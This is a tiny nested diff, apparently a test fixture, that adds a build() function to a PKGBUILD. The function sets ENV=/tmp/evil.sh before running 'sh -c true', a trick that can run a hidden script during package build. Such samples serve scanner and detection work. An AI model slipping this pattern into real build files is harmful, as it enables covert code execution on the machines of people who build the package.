@@ -1,0 +1,7 @@
+--- a/PKGBUILD
++++ b/PKGBUILD
+@@ -1,2 +1,5 @@
+ pkgname=p
++build() {
++  ENV=/tmp/evil.sh sh -c true
++}
